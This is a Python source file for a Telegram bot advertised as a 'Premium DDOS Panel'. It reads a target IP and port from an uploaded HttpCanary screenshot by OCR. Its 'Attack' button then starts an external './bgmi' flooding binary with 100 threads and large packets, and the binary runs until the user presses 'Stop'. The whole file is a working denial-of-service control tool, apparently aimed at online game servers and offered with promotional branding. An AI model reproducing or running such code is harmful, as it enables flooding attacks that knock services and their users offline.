import os
import re
import sys
import signal
import subprocess
from io import BytesIO
from datetime import datetime
from PIL import Image
import pytesseract
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import TELEGRAM_BOT_TOKEN

selected_target = {}
attack_process = None

import pytesseract
from PIL import Image

# IMPORTANT: Set tesseract path
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

# 💣 Fixed Info (safe inside daku.py)
OWNER_USERNAME = '@DARINDAxOWNER'
CHANNEL_LINK = 'https://t.me/+744pifuvw-o1ZTI9'
EXPIRY_DATE = datetime(2085, 8, 2)

def check_expiry():
    if datetime.now() > EXPIRY_DATE:
        print(f"❌ This bot has expired. Join {OWNER_USERNAME} to get a new version.")
        sys.exit()

def welcome_banner():
    banner = f"""
────────────────────────────────────────
🔥 WELCOME TO DARINDA VIP TOOL 🔥

💣 Premium DDOS Panel 💣
🔒 Secure Access Only
👑 Owner: {OWNER_USERNAME}

📢 Join our channel:
➡️ {CHANNEL_LINK}
────────────────────────────────────────
"""
    print(banner)

def extract_ip_port_from_image(image: Image.Image):
    text = pytesseract.image_to_string(image)
    matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)[:\s](100\d+)", text)
    if matches:
        return matches[0][0], int(matches[0][1])
    return None, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *DDoS Panel Bot by DARINDAxOWNER*\n\n"
        "📸 Please send a clear HttpCanary screenshot to automatically extract the IP and Port (Port must start with `100**`).\n\n"
        "⬇️ Once target is detected, use the buttons below to *start* or *stop* the attack.\n\n"
        "_Note: Buttons will always remain visible for easy control._",
        parse_mode="Markdown"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo = update.message.photo[-1]
    file = await photo.get_file()
    image_bytes = await file.download_as_bytearray()
    image = Image.open(BytesIO(image_bytes))

    ip, port = extract_ip_port_from_image(image)

    if ip and port:
        selected_target[update.effective_chat.id] = (ip, port)

        keyboard = [[KeyboardButton("🚀 Attack"), KeyboardButton("⛔ Stop")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        await update.message.reply_text(
            f"🎯 Target Detected:\n`{ip}:{port}`\n\nChoose action:",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text("❌ IP/Port not found. Send clear screenshot.")

async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    if chat_id not in selected_target:
        await update.message.reply_text("❌ No target selected.")
        return

    ip, port = selected_target[chat_id]

    if text == "🚀 Attack":
        if attack_process:
            await update.message.reply_text("⚠️ Already running!")
            return

        # No duration so runs until manually stopped
        packet_size = 10024
        threads = 100
        command = ["./bgmi", ip, str(port), "9999", str(packet_size), str(threads)]

        attack_process = subprocess.Popen(command)

        await update.message.reply_text(
            f"🔥 Attack Started!\n🎯 `{ip}:{port}`\n\n⏹️ Use Stop button to end.",
            parse_mode="Markdown"
        )

    elif text == "⛔ Stop":
        if attack_process and attack_process.poll() is None:
            os.kill(attack_process.pid, signal.SIGINT)
            attack_process.wait()
            attack_process = None
            await update.message.reply_text("✅ Attack stopped.")
        else:
            await update.message.reply_text("ℹ️ No running attack.")

def main():
    check_expiry()
    welcome_banner()
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
